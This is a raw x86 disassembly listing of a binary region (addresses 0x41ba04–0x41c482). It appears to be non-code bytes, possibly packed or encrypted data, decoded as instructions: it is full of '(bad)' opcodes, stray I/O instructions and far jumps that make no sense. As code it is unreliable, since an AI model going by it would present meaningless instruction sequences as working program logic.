  41ba04:	or     DWORD PTR [esi-0x1ad7a4c9],esi
  41ba0a:	inc    esi
  41ba0b:	push   eax
  41ba0c:	icebp  
  41ba0d:	mov    WORD PTR [edx+edx*8+0x38],es
  41ba11:	xchg   DWORD PTR [edi+edx*2+0x60],edi
  41ba15:	(bad)  
  41ba16:	dec    BYTE PTR [ebx+0x7d]
  41ba19:	inc    DWORD PTR [eax+0x62]
  41ba1c:	jo     0x41b9e3
  41ba1e:	dec    BYTE PTR [ebx+0x7d]
  41ba21:	or     eax,0x0
	...
  41ba4a:	add    BYTE PTR [eax],al
  41ba4c:	test   eax,0x348ccf7a
  41ba51:	shr    BYTE PTR [eax],cl
  41ba53:	inc    esp
  41ba54:	dec    ebx
  41ba55:	(bad)
  41ba58:	jno    0x41bac5
  41ba5a:	loop   0x41ba69
  41ba5c:	rcl    DWORD PTR [ecx+0x60],0xc5
  41ba60:	dec    BYTE PTR [ebx+0x3d]
  41ba63:	or     eax,0xeef79f9
  41ba68:	inc    esp
  41ba69:	dec    esp
  41ba6a:	cmp    eax,0x609a4104
  41ba6f:	push   cs
  41ba70:	xchg   DWORD PTR [ecx-0x2f90fc11],ebx
  41ba76:	xor    esp,DWORD PTR [eax]
  41ba78:	inc    esi
  41ba79:	shl    BYTE PTR [ebx],1
  41ba7b:	and    BYTE PTR [edx],bh
  41ba7d:	shr    cl,1
  41ba7f:	les    edx,FWORD PTR [esi]
  41ba81:	arpl   WORD PTR [edi+0x4],bp
  41ba84:	cmp    eax,edx
  41ba86:	jmp    0x5faca14f
  41ba8b:	add    al,0x29
  41ba8d:	shr    cl,1
  41ba8f:	(bad)  
  41ba90:	(bad)  
  41ba91:	push   edx
  41ba92:	outs   dx,DWORD PTR ds:[esi]
  41ba93:	add    al,0x19
  41ba95:	shl    BYTE PTR [edx+0x6aaab944],cl
  41ba9b:	lds    eax,FWORD PTR [edx-0x30]
  41ba9e:	out    0x8b,eax
  41baa0:	aas    
  41baa1:	shr    cl,1
  41baa3:	les    esp,FWORD PTR [esi+0x71046f62]
  41baa9:	rol    BYTE PTR [eax],1
  41baab:	jmp    0x41ba2f
  41baad:	jb     0x41babf
  41baaf:	popa   
	...
  41bad8:	add    BYTE PTR [eax],al
  41bada:	cmp    bh,BYTE PTR [ecx+ecx*4]
  41badd:	jmp    0x41ba61
  41badf:	jb     0x41bae9
  41bae1:	jno    0x41bb1d
  41bae3:	cmp    al,0x89
  41bae5:	sti    
  41bae6:	mov    ch,0xaa
  41bae8:	mov    al,ch
  41baea:	inc    eax
  41baeb:	cdq    
  41baec:	or     cl,ch
  41baee:	cs aam 0xe3
  41baf1:	push   0x59
  41baf3:	dec    esi
  41baf4:	push   ecx
  41baf5:	lahf   
  41baf6:	sub    al,0xd2
  41baf8:	inc    ebx
  41baf9:	fnsave [eax+0x53720827]
  41baff:	ror    BYTE PTR [ebx-0xf],cl
  41bb02:	rcl    BYTE PTR [ebx],0x4
  41bb05:	pusha  
  41bb06:	nop
  41bb07:	mov    ebx,0x922ae5e9
  41bb0c:	jg     0x41bb18
  41bb0e:	inc    esp
  41bb0f:	push   0x924aee0d
  41bb14:	xchg   DWORD PTR [edi],edx
  41bb16:	add    al,BYTE PTR [edx-0x1cf447fc]
  41bb1c:	(bad)  
  41bb1d:	test   al,0x24
  41bb1f:	dec    esp
  41bb20:	das    
  41bb21:	scas   eax,DWORD PTR es:[edi]
  41bb22:	lds    ebp,FWORD PTR [edi+edi*2-0x36]
  41bb26:	out    0x78,eax
  41bb28:	add    cl,ch
  41bb2a:	sub    al,0x92
  41bb2c:	xchg   DWORD PTR [edi-0x7ef7e03],esp
  41bb32:	or     esp,ebx
  41bb34:	into   
  41bb35:	test   al,0xd4
  41bb37:	pop    ebp
  41bb38:	das    
  41bb39:	xchg   edi,eax
  41bb3a:	mov    ch,0x6c
  41bb3c:	jg     0x41bac8
	...
  41bb66:	add    BYTE PTR [eax],al
  41bb68:	xor    ebp,DWORD PTR [ecx+esi*1]
  41bb6b:	fisubr DWORD PTR [edx*4-0x7e024879]
  41bb72:	add    bl,al
  41bb74:	in     al,dx
  41bb75:	loop   0x41bb45
  41bb77:	add    dh,ah
  41bb79:	test   DWORD PTR [eax],ecx
  41bb7b:	xor    ecx,ecx
  41bb7d:	out    0xef,al
  41bb7f:	xor    DWORD PTR [esp+edx*4+0x4d97ff00],0x9e0189da
  41bb8a:	out    0x8,al
  41bb8c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bb8e:	test   DWORD PTR [ebp-0xd],esi
  41bb91:	pop    ebp
  41bb92:	test   BYTE PTR [ebx-0x10426d8e],0x60
  41bb99:	(bad)  
  41bb9b:	add    esi,ebp
  41bb9d:	lea    eax,ds:0x2dacdef9
  41bba3:	into   
  41bba4:	fimul  WORD PTR [edi-0x37121c83]
  41bbaa:	stos   BYTE PTR es:[edi],al
  41bbab:	stos   BYTE PTR es:[edi],al
  41bbac:	jbe    0x41bb66
  41bbae:	sub    eax,0x124ae2d9
  41bbb3:	mov    DWORD PTR [eax],ecx
  41bbb5:	sahf   
  41bbb6:	jmp    0x41bbd7
  41bbb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbb9:	jl     0x41bbb8
  41bbbb:	mov    BYTE PTR ds:0xdac7fa65,dh
  41bbc1:	xchg   ebp,eax
  41bbc2:	or     BYTE PTR [eax],al
  41bbc4:	pop    ss
  41bbc5:	pop    esi
  41bbc6:	test   esi,ecx
  41bbc8:	out    0x7b,al
  41bbca:	sbb    al,0x89
	...
  41bbf4:	add    BYTE PTR [eax],al
  41bbf6:	loopne 0x41bb94
  41bbf8:	jmp    0x41bbfe
  41bbfa:	sahf   
  41bbfb:	pop    DWORD PTR ds:0x7f9c9efb
  41bc01:	shr    bl,0x4e
  41bc04:	push   ds
  41bc05:	mov    ecx,edx
  41bc07:	fsubrp st(6),st
  41bc09:	aas    
  41bc0a:	pop    esp
  41bc0b:	push   0xffffffb1
  41bc0d:	rcl    BYTE PTR [ebx],1
  41bc0f:	push   ds
  41bc10:	add    BYTE PTR [ecx+0x6eb9d00],cl
  41bc16:	data16 jnp 0x41bc15
  41bc19:	add    BYTE PTR [esi],bh
  41bc1b:	test   BYTE PTR [ecx],al
  41bc1d:	or     DWORD PTR [ecx+0x3e3f5bb3],ecx
  41bc23:	jmp    0x41bbdc
  41bc25:	mov    edi,0xe58289a1
  41bc2a:	stos   BYTE PTR es:[edi],al
  41bc2b:	add    DWORD PTR [ecx],0x0
  41bc2e:	xor    eax,0xff78b131
  41bc33:	or     DWORD PTR [edx-0x10d78023],0x7e
  41bc3a:	mov    eax,ds:0x3e00010f
  41bc3f:	jge    0x41bbd1
  41bc41:	shl    al,1
  41bc43:	ret    0x8701
  41bc46:	jmp    0x41bc77
  41bc48:	mov    al,dh
  41bc4a:	mov    ebp,0x7586fd43
  41bc4f:	je     0x41bc48
  41bc51:	xchg   BYTE PTR [eax+0x4],bh
  41bc54:	fistp  QWORD PTR ds:0xd08e8fc5
	...
  41bc82:	add    BYTE PTR [eax],al
  41bc84:	retf   
  41bc85:	ret    0x901
  41bc88:	retf   
  41bc89:	dec    edi
  41bc8a:	mov    bl,ch
  41bc8c:	call   DWORD PTR [ecx-0x1]
  41bc8f:	jle    0x41bcaa
  41bc91:	ja     0x41bc95
  41bc93:	add    BYTE PTR [esi],bh
  41bc95:	jge    0x41bc27
  41bc97:	shl    BYTE PTR [ebp-0x678fe3d],1
  41bc9d:	ret    
  41bc9e:	in     eax,0xe
  41bca0:	mov    edi,0x3e00d8a1
  41bca5:	or     BYTE PTR [edx],0xb5
  41bca8:	out    dx,al
  41bca9:	or     eax,DWORD PTR [ebx+0x0]
  41bcac:	mov    ecx,0x348edc3
  41bcb2:	(bad)  
  41bcb4:	add    BYTE PTR ds:[ecx],0x9
  41bcb8:	test   eax,0x3e3f4dd2
  41bcbd:	pop    ebx
  41bcbe:	fcom   st(1)
  41bcc0:	mov    ecx,0x2adea891
  41bcc5:	loop   0x41bc85
  41bcc7:	vmaxsd xmm4,xmm5,QWORD PTR [eax-0x2d]
  41bccc:	inc    ecx
  41bccd:	je     0x41bd3f
  41bccf:	mov    esi,0x12e39bbf
  41bcd4:	dec    eax
  41bcd5:	loop   0x41bc6c
  41bcd7:	sbb    DWORD PTR [eax-0x32ef9dc8],0xffffff8b
  41bcde:	jecxz  0x41bd24
  41bce0:	ds loop 0x41bd21
  41bce3:	lds    ebx,FWORD PTR [ebx+0xdf6861]
	...
  41bd11:	add    BYTE PTR [edx+0x4703e75b],al
  41bd17:	mov    al,0x17
  41bd19:	pop    edx
  41bd1a:	xor    DWORD PTR [ebx+0x70],ebx
  41bd1d:	mov    bh,0xa9
  41bd1f:	mov    ch,ah
  41bd21:	test   BYTE PTR [ebx+0x77],bl
  41bd24:	out    0x3,eax
  41bd26:	ds fs pop esi
  41bd29:	mov    ah,0xd6
  41bd2b:	sbb    edi,esp
  41bd2d:	mov    WORD PTR [ebx-0x66],gs
  41bd30:	push   es
  41bd31:	out    dx,al
  41bd32:	sar    BYTE PTR [edi+0xb],0x4
  41bd36:	ds pop ebx
  41bd38:	repnz mov cs,WORD PTR [esi]
  41bd3b:	icebp  
  41bd3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3d:	add    eax,ecx
  41bd3f:	in     eax,dx
  41bd40:	cli    
  41bd41:	mov    eax,?
  41bd43:	(bad)  [edi]
  41bd45:	add    cl,al
  41bd47:	mov    ebx,DWORD PTR [edx]
  41bd49:	idiv   BYTE PTR [eax+0x4bdd6a98]
  41bd4f:	in     al,0x1b
  41bd51:	xchg   ecx,eax
  41bd52:	out    dx,al
  41bd53:	cmc    
  41bd54:	daa    
  41bd55:	add    al,0x47
  41bd57:	out    dx,al
  41bd58:	mov    edx,0xce9a138c
  41bd5d:	std    
  41bd5e:	push   0x3db50080
  41bd63:	pop    ebx
  41bd64:	add    dl,ah
  41bd66:	enter  0x798a,0x28
  41bd6a:	cmp    ah,al
  41bd6c:	(bad)  [eax-0x71809720]
  41bd72:	jmp    0x12abdd1
	...
  41bd9f:	add    BYTE PTR [esi+ebp*4-0x30],al
  41bda3:	add    bl,bh
  41bda5:	pop    edx
  41bda6:	xchg   DWORD PTR [esi+0x68168582],ebx
  41bdac:	xor    BYTE PTR [esi+0x0],0xe9
  41bdb0:	cmp    eax,0x39b562
  41bdb5:	cmp    BYTE PTR [eax],al
  41bdb7:	sbb    BYTE PTR [ebx+0x75],dh
  41bdba:	dec    ebx
  41bdbb:	push   ecx
  41bdbc:	mov    esp,0x40e9f7f3
  41bdc1:	fsubr  QWORD PTR [ecx-0x788a77b9]
  41bdc7:	xor    DWORD PTR [edx+0x7b601d7a],eax
  41bdcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdce:	out    dx,al
  41bdcf:	pusha  
  41bdd0:	sbb    BYTE PTR [edi-0x11],0x70
  41bdd4:	lea    eax,[edi-0x38]
  41bdd7:	jo     0x41be55
  41bdd9:	mul    eax
  41bddb:	inc    ebx
  41bddc:	xchg   edi,eax
  41bddd:	les    ebp,FWORD PTR [edx-0x28b90828]
  41bde3:	jo     0x41bdd2
  41bde5:	mov    dh,0xe0
  41bde7:	fidivr WORD PTR [edx-0x4df83073]
  41bded:	cdq    
  41bdee:	pop    es
  41bdef:	sti    
  41bdf0:	lds    ecx,FWORD PTR [ebx+0x4642d1bf]
  41bdf6:	enter  0xff70,0xf6
  41bdfa:	loopne 0x41bdd2
  41bdfc:	cmp    bh,BYTE PTR [eax+0x0]
  41bdff:	sbb    BYTE PTR [ebp+0xd8de],dh
	...
  41be2d:	add    BYTE PTR [esi-0x6acef781],ah
  41be33:	loop   0x41be05
  41be35:	sar    edi,0x59
  41be38:	sub    eax,0x7d9c5ec8
  41be3d:	jecxz  0x41be33
  41be3f:	dec    ebx
  41be40:	das    
  41be41:	xor    esp,esi
  41be43:	mov    cl,0x85
  41be45:	fcom   DWORD PTR [esi-0x1acefd81]
  41be4b:	loop   0x41be15
  41be4d:	ror    edi,0x6f
  41be50:	shr    BYTE PTR cs:[esi],1
  41be53:	pushf  
  41be54:	jge    0x41be39
  41be56:	sub    BYTE PTR [eax-0x4b2a0000],dl
  41be5c:	test   eax,ebx
  41be5e:	data16 jg 0x41be71
  41be61:	xor    DWORD PTR [esi-0x1e],edx
  41be64:	enter  0xffc1,0x5a
  41be68:	sub    eax,0x7d9bded0
  41be6d:	jecxz  0x41bed7
  41be6f:	pop    edi
  41be70:	or     ecx,DWORD PTR [edi]
  41be72:	data16 mov ah,0x87
  41be75:	inc    ebp
  41be76:	pop    edi
  41be77:	cdq    
  41be78:	fild   WORD PTR [esi+edx*2]
  41be7b:	mov    ds:0x35e41885,eax
  41be80:	or     BYTE PTR [esp+ecx*8],al
  41be83:	xor    eax,0x2f478908
  41be88:	pop    esi
  41be89:	pop    ebx
  41be8a:	sahf   
  41be8b:	sbb    DWORD PTR [ecx-0x3e],0x2f
  41be8f:	pop    edx
  41be90:	dec    edi
  41be91:	push   esi
	...
  41beba:	add    BYTE PTR [eax],al
  41bebc:	lods   al,BYTE PTR ds:[esi]
  41bebd:	xor    esp,DWORD PTR [esp+ecx*1]
  41bec0:	mov    cl,0xe2
  41bec2:	je     0x41bee8
  41bec4:	not    DWORD PTR [edi]
  41bec6:	xor    esi,0xfcd0608
  41becc:	mov    cl,0x98
  41bece:	or     esi,DWORD PTR [edi-0x74ce3bc2]
  41bed4:	jge    0x41bf52
  41bed6:	xor    eax,ebp
  41bed8:	mov    ebx,DWORD PTR [edx-0x2ba9022c]
  41bede:	dec    ebp
  41bedf:	aas    
  41bee0:	ds pushf 
  41bee2:	or     ah,bh
  41bee4:	fld    st(4)
  41bee6:	add    al,0xb5
  41bee8:	enter  0x2f35,0xe8
  41beec:	jg     0x41bea8
  41beee:	aam    0xfd
  41bef0:	push   esi
  41bef1:	xor    al,0x4d
  41bef3:	aas    
  41bef4:	ds fmul st(4),st
  41bef7:	stc    
  41bef8:	mov    cl,0xdc
  41befa:	xor    ebx,DWORD PTR [ecx+0x7c]
  41befd:	imul   eax,DWORD PTR [ecx],0x53
  41bf00:	mov    bh,0xe6
  41bf02:	xor    DWORD PTR [eax-0x13],edx
  41bf05:	clc    
  41bf06:	cmp    eax,0x59ec508
  41bf0b:	mov    esi,ebx
  41bf0d:	sti    
  41bf0e:	cs push eax
  41bf10:	xchg   esi,eax
  41bf11:	mov    esi,0x9b79fdd5
  41bf16:	xor    DWORD PTR [edi+edi*8-0x7d],esi
  41bf1a:	xchg   BYTE PTR [ebx+0x66],al
  41bf1d:	shr    ecx,cl
  41bf1f:	cmc    
	...
  41bf48:	add    BYTE PTR [eax],al
  41bf4a:	bound  ebp,QWORD PTR [esp+edx*8]
  41bf4d:	push   0x42af6e
  41bf52:	ret    
  41bf53:	(bad)  
  41bf54:	fst    DWORD PTR [eax+0x56]
  41bf57:	dec    edx
  41bf58:	aad    0xfd
  41bf5a:	inc    ecx
  41bf5b:	(bad)  [ecx]
  41bf5d:	jae    0x41bfde
  41bf5f:	add    BYTE PTR [esi-0x162cc9bd],0xd9
  41bf66:	sub    dh,BYTE PTR [esi-0x2f]
  41bf69:	push   ecx
  41bf6a:	mov    bl,0xc7
  41bf6c:	fst    DWORD PTR [eax+0x26]
  41bf6f:	add    ebp,edx
  41bf71:	std    
  41bf72:	adc    DWORD PTR [edx+eax*2+0x7d],ebx
  41bf76:	sbb    dl,BYTE PTR [edi]
  41bf78:	test   eax,0x601001fc
  41bf7d:	jmp    0x37394741
  41bf82:	mov    al,ah
  41bf84:	and    al,0xfc
  41bf86:	mov    dh,0xee
  41bf88:	jmp    0xe637:0x17737d80
  41bf8f:	jno    0x41bf43
  41bf91:	rcl    ebx,cl
  41bf93:	out    0x2c,al
  41bf95:	aam    0x6e
  41bf97:	fsubr  DWORD PTR [edx-0x7b7c9104]
  41bf9d:	iret   
  41bf9e:	mov    ebx,0x2a33ff74
  41bfa3:	sbb    ah,bh
  41bfa5:	cmp    ch,0x72
  41bfa8:	pop    ss
  41bfa9:	fmul   st(3),st
  41bfab:	ja     0x41c023
  41bfad:	rol    DWORD PTR [eax],cl
	...
  41bfd7:	add    BYTE PTR [esi],ah
  41bfd9:	or     esi,ebx
  41bfdb:	inc    esp
  41bfdc:	ds out 0xac,al
  41bfdf:	shr    esi,cl
  41bfe1:	xor    BYTE PTR [eax-0x30],0x83
  41bfe5:	je     0x41c049
  41bfe7:	xor    DWORD PTR [edx-0x20],edi
  41bfea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfeb:	sar    DWORD PTR [ecx+0x57d431e],cl
  41bff1:	imul   ecx,edi,0xffffffb3
  41bff4:	jmp    0x9772:0xfd80e719
  41bffb:	fninit 
  41bffd:	jbe    0x41c025
  41bfff:	rcl    esi,cl
  41c001:	mov    dl,BYTE PTR [ebx-0x5319c1bc]
  41c007:	ror    DWORD PTR [esi+0x33cf8883],cl
  41c00d:	je     0x41c081
  41c00f:	xor    DWORD PTR [edx],ebp
  41c011:	loopne 0x41bfb7
  41c013:	sar    DWORD PTR [ecx-0x650affe3],cl
  41c019:	adc    al,dh
  41c01b:	or     DWORD PTR [ebp-0x18],0x17bee93e
  41c022:	clc    
  41c023:	cmp    edx,esp
  41c025:	sbb    eax,0x30cd6fc
  41c02a:	push   eax
  41c02b:	push   esp
  41c02c:	jnp    0x41c089
  41c02e:	mov    ebp,DWORD PTR [edx+edx*1]
  41c031:	or     ebp,eax
  41c033:	add    BYTE PTR [esi],cl
  41c035:	jbe    0x41c034
  41c037:	pop    ds
  41c038:	mov    edi,0x19f817
	...
  41c065:	add    dl,dh
  41c067:	jp     0x41c062
  41c069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c06a:	in     al,dx
  41c06b:	fld    st(6)
  41c06d:	icebp  
  41c06e:	pop    es
  41c06f:	loopne 0x41c0b4
  41c071:	cdq    
  41c072:	ins    DWORD PTR es:[edi],dx
  41c073:	adc    ecx,0xffffff92
  41c076:	mov    WORD PTR [ebp+0x5e],?
  41c079:	and    ch,BYTE PTR [ebx]
  41c07b:	xchg   DWORD PTR [ebx-0x55],ebx
  41c07e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c07f:	jae    0x41c0d5
  41c081:	pusha  
  41c082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c083:	repz jmp 0x41c0e3
  41c086:	cmp    bl,BYTE PTR [ebx+0x0]
  41c089:	mov    edx,0xbc890e47
  41c08e:	test   edx,esp
  41c090:	jae    0x41c077
  41c092:	mov    esi,0x8c4f80d7
  41c097:	jne    0x41c0e9
  41c099:	push   ecx
  41c09a:	into   
  41c09b:	jae    0x41c09a
  41c09d:	jmp    0x19aa1ba5
  41c0a2:	div    BYTE PTR [ebx]
  41c0a4:	add    BYTE PTR [ecx-0x36],al
  41c0a7:	je     0x41c0a6
  41c0a9:	xor    cl,BYTE PTR es:[ecx-0x18729476]
  41c0b0:	ds jmp 0xab74186b
  41c0b6:	mov    eax,0xc3000875
  41c0bb:	xchg   ebx,eax
  41c0bd:	test   DWORD PTR [edi+0x26fffb8c],edi
  41c0c3:	pop    edi
  41c0c4:	add    BYTE PTR [eax],al
  41c0c6:	cmp    al,0x2a
  41c0c8:	test   eax,esi
	...
  41c0f2:	add    BYTE PTR [eax],al
  41c0f4:	mov    ds,edx
  41c0f6:	je     0x41c0f6
  41c0f8:	loopne 0x41c086
  41c0fa:	sub    eax,0x8747fcd2
  41c0ff:	test   DWORD PTR [ebx+0x6efffb8d],ecx
  41c105:	fidivr DWORD PTR [esi+edi*8-0x60]
  41c109:	mov    ebx,?
  41c10b:	test   DWORD PTR [ebx],ebx
  41c10d:	(bad)  
  41c10e:	sti    
  41c10f:	call   FWORD PTR [edx+esi*8+0x7b]
  41c113:	(bad)  
  41c114:	mov    al,ds:0xd4be0b8c
  41c119:	xlat   BYTE PTR ds:[ebx]
  41c11a:	loopne 0x41c19b
  41c11c:	sbb    al,0xe2
  41c11e:	jl     0x41c11e
  41c120:	ror    BYTE PTR [ebx+ecx*1-0x7b27f4a],0x88
  41c128:	xchg   esi,eax
  41c129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c12a:	(bad)  
  41c12b:	jmp    DWORD PTR [ecx+ebx*1+0x7f]
  41c12f:	cli    
  41c130:	lahf   
  41c131:	and    DWORD PTR [ecx],eax
  41c133:	sbb    BYTE PTR [edi+edx*2+0x71],0xc6
  41c138:	leave  
  41c139:	xor    al,0xe8
  41c13b:	imul   edx,DWORD PTR [ecx],0xffffff8c
  41c13e:	sti    
  41c13f:	cmp    DWORD PTR [edx+0xfffe1f],0x57
  41c146:	cmp    BYTE PTR [ebx],0x57
  41c149:	or     DWORD PTR [ebx-0x1e12d7d],esp
  41c14f:	jmp    DWORD PTR [eax]
  41c151:	push   edi
  41c152:	jno    0x41c0f2
  41c154:	rcr    cl,cl
  41c156:	cmp    dh,0x0
	...
  41c181:	add    BYTE PTR [eax],ah
  41c183:	mov    WORD PTR [eax-0x18],ss
  41c186:	ds loope 0x41c18b
  41c189:	add    BYTE PTR [esi],bh
  41c18b:	shr    DWORD PTR [edi],0x59
  41c18e:	mov    bh,0x47
  41c190:	sub    eax,0x368436c2
  41c195:	xchg   DWORD PTR [ebx],esp
  41c197:	add    esp,eax
  41c199:	mov    WORD PTR [edi],?
  41c19b:	test   BYTE PTR [ecx],al
  41c19d:	push   ecx
  41c19e:	jo     0x41c1d1
  41c1a0:	jnp    0x41c1fd
  41c1a2:	ss in  eax,dx
  41c1a4:	push   ebp
  41c1a5:	or     al,0xcb
  41c1a7:	inc    BYTE PTR [eax+0x31a0f1fe]
  41c1ad:	call   0x43459b
  41c1b2:	push   esp
  41c1b3:	test   BYTE PTR [ecx-0x30],bl
  41c1b6:	push   ebx
  41c1b7:	inc    ebx
  41c1b8:	add    al,0xe8
  41c1ba:	in     eax,dx
  41c1bb:	mov    esi,0xb60ffdd0
  41c1c0:	jnp    0x41c144
  41c1c2:	out    dx,al
  41c1c3:	inc    esi
  41c1c4:	inc    ecx
  41c1c5:	add    dh,al
  41c1c7:	jg     0x41c1dc
  41c1c9:	inc    edx
  41c1ca:	mov    ebp,0xaf7bf1cd
  41c1cf:	rol    BYTE PTR [esi-0x300f5f88],0xff
  41c1d6:	cdq    
  41c1d7:	add    DWORD PTR [ecx],0xffffffe9
  41c1da:	jmp    0xcf8f:0xc387d0fa
  41c1e1:	std    
  41c1e2:	adc    DWORD PTR [edx-0x4a],0xe9
	...
  41c20d:	add    BYTE PTR [eax],al
  41c20f:	add    BYTE PTR [esi],ch
  41c211:	std    
  41c212:	test   DWORD PTR [eax+esi*2+0x20],esi
  41c216:	rol    BYTE PTR [edi-0x230683d],1
  41c21c:	popa   
  41c21d:	xor    BYTE PTR [esi-0x2fd7a78c],al
  41c223:	mov    ebx,eax
  41c225:	mov    edi,0x5a49fdcf
  41c22a:	not    BYTE PTR [ecx+0x5007de3f]
  41c230:	(bad)  
  41c231:	scas   al,BYTE PTR es:[edi]
  41c232:	xchg   ebx,eax
  41c233:	shl    DWORD PTR [ebx],1
  41c235:	jno    0x41c215
  41c237:	cdq    
  41c238:	imul   ebp,DWORD PTR [edx],0xffffffff
  41c23b:	jp     0x41c25e
  41c23d:	xchg   edi,eax
  41c23e:	jmp    0x2ecd:0x6a1d7f03
  41c245:	out    dx,al
  41c246:	jecxz  0x41c1cb
  41c248:	inc    edi
  41c249:	pop    ebx
  41c24a:	pop    esp
  41c24b:	(bad)  
  41c24c:	push   0xf5cecf09
  41c251:	jo     0x41c229
  41c253:	sbb    DWORD PTR [ebp-0x1430330d],0x5b
  41c25a:	or     edi,DWORD PTR ds:0x85e6
  41c25f:	adc    DWORD PTR [ebp-0x2c304b0d],0x5b
  41c266:	xor    al,0x6e
  41c268:	mov    ch,0xd6
  41c26a:	addr16 into 
  41c26c:	ret    
  41c26d:	jo     0x41c2a6
  41c26f:	fsubr  st(1),st
  41c271:	pop    ebx
  41c272:	out    0x3,eax
	...
  41c29c:	add    BYTE PTR [eax],al
  41c29e:	adc    edx,DWORD PTR [ecx]
  41c2a0:	xor    bh,BYTE PTR [ebp-0x66]
  41c2a3:	push   cs
  41c2a4:	test   eax,0x150da1fc
  41c2a9:	aaa    
  41c2aa:	(bad)  
  41c2ab:	pop    ss
  41c2ac:	retf   
  41c2ad:	repz sbb esp,esp
  41c2b0:	or     ebp,DWORD PTR [eax]
  41c2b2:	xor    bh,cl
  41c2b4:	imul   ebp,DWORD PTR [ebx-0x398f9bf3],0xffffffc5
  41c2bb:	repz mul BYTE PTR [ebp-0x4c]
  41c2bf:	pop    edx
  41c2c0:	out    0xda,eax
  41c2c2:	fidiv  WORD PTR ss:[edi-0x3a67470d]
  41c2c9:	adc    al,0x6c
  41c2cb:	pusha  
  41c2cc:	add    BYTE PTR [esi-0x74],bh
  41c2cf:	or     eax,0x204a2981
  41c2d4:	call   0xfdb02c46
  41c2d9:	xchg   ecx,eax
  41c2da:	in     eax,dx
  41c2db:	out    0x3e,al
  41c2dd:	jmp    0xf38f7f7
  41c2e2:	stc    
  41c2e3:	pop    ebp
  41c2e4:	mov    ch,0x22
  41c2e6:	ins    DWORD PTR es:[edi],dx
  41c2e7:	push   es
  41c2e8:	call   0xfdafb366
  41c2ed:	or     DWORD PTR [ebp-0x14],0x38e5e93e
  41c2f4:	mul    esi
  41c2f6:	lock pop ebp
  41c2f8:	mov    ch,0xc2
  41c2fa:	sub    al,0x9
  41c2fc:	call   0xfdafcc36
  41c301:	add    BYTE PTR cs:[eax],al
	...
  41c32c:	sbb    BYTE PTR [edx],dl
  41c32e:	ret    0x3df1
  41c331:	or     cl,BYTE PTR [ecx+0x5163261d]
  41c337:	rcl    esp,0x68
  41c33a:	std    
  41c33b:	scas   al,BYTE PTR es:[edi]
  41c33c:	ret    0x8099
  41c33f:	jmp    0xb9fa1e81
  41c344:	adc    DWORD PTR [eax],esi
  41c346:	add    BYTE PTR [edx-0x53],ah
  41c349:	fcom   DWORD PTR [ecx]
  41c34b:	push   0x7d
  41c34d:	push   esi
  41c34e:	sub    DWORD PTR [edx-0xbafcbc7],0x86725b02
  41c358:	lds    ecx,FWORD PTR [edx]
  41c35a:	jae    0x41c384
  41c35c:	inc    edx
  41c35d:	loop   0x41c36f
  41c35f:	jo     0x41c2ed
  41c361:	fcmovb st,st(0)
  41c363:	in     eax,0xbc
  41c365:	cdq    
  41c366:	add    al,0x14
  41c368:	stos   BYTE PTR es:[edi],al
  41c369:	jmp    0x41c3a9
  41c36b:	jmp    0x9b417f
  41c370:	adc    eax,0xcc530058
  41c375:	aas    
  41c376:	and    al,0x8
  41c378:	mov    ah,0x93
  41c37a:	call   0x7de2dc77
  41c37f:	ret    
  41c380:	xlat   BYTE PTR ds:[ebx]
  41c381:	pop    ebx
  41c382:	add    BYTE PTR [eax],al
  41c384:	lahf   
  41c385:	stos   BYTE PTR es:[edi],al
  41c386:	je     0x41c3c9
  41c388:	daa    
  41c389:	repnz push cs
  41c38b:	mov    DWORD PTR [edi],esp
  41c38d:	fidivr DWORD PTR [edi+0x4]
	...
  41c3b7:	add    BYTE PTR [eax],al
  41c3b9:	add    BYTE PTR [edx+ebx*4+0x13b73d04],dl
  41c3c0:	cmp    eax,0xb88d9500
  41c3c5:	push   eax
  41c3c6:	xchg   edx,eax
  41c3c7:	pop    ss
  41c3c8:	add    BYTE PTR [ebx-0x7cf00dfc],cl
  41c3ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3cf:	arpl   WORD PTR [edi-0x40],di
  41c3d2:	jecxz  0x41c431
  41c3d4:	shl    BYTE PTR [ebp+0x16],1
  41c3d7:	push   edi
  41c3d8:	jb     0x41c3c9
  41c3da:	sbb    al,0x99
  41c3dc:	add    al,0x0
  41c3de:	xor    dh,dl
  41c3e0:	loopne 0x41c365
  41c3e2:	sti    
  41c3e3:	jg     0x41c435
  41c3e5:	push   esi
  41c3e6:	pop    esp
  41c3e7:	or     BYTE PTR ds:[ebx+0x45895b22],cl
  41c3ee:	fbld   TBYTE PTR [edi]
  41c3f0:	dec    edi
  41c3f1:	call   0x3d63b0
  41c3f6:	or     dl,BYTE PTR [esi]
  41c3f8:	lock push eax
  41c3fa:	sub    bl,BYTE PTR [eax+ecx*1]
  41c3fd:	push   eax
  41c3fe:	scas   eax,DWORD PTR es:[edi]
  41c3ff:	ja     0x41c3f9
  41c401:	dec    DWORD PTR [eax]
  41c403:	out    dx,al
  41c404:	inc    eax
  41c405:	call   0x1101a031
  41c40a:	les    edx,FWORD PTR [edx-0x5fe70731]
  41c410:	push   0x42903e50
  41c415:	add    BYTE PTR [ebx+0x5650c9b7],bh
  41c41b:	xchg   edi,eax
  41c41c:	retf   0xfd
	...
  41c447:	add    BYTE PTR [ecx-0x74],bl
  41c44a:	xor    DWORD PTR [edi+edi*8-0x7d],esi
  41c44e:	jle    0x41c493
  41c450:	dec    esi
  41c451:	aam    0xd9
  41c453:	ins    DWORD PTR es:[edi],dx
  41c454:	inc    edi
  41c455:	xor    eax,0xc88e68cb
  41c45a:	inc    edx
  41c45b:	add    bl,al
  41c45d:	mov    esi,0xe31650d9
  41c462:	retf   0x21fd
  41c465:	jmp    0xb707c096
  41c46a:	rol    DWORD PTR [edi+0x5b7a687b],1
  41c470:	push   cs
  41c471:	stc    
  41c472:	sub    al,0xf4
  41c474:	mov    ch,0x3e
  41c476:	fadd   QWORD PTR [edi+0x5b7a8883]
  41c47c:	out    0x1b,al
  41c47e:	mov    ah,0x74
  41c480:	jg     0x41c406
  41c482:	jle    0x41c4c7
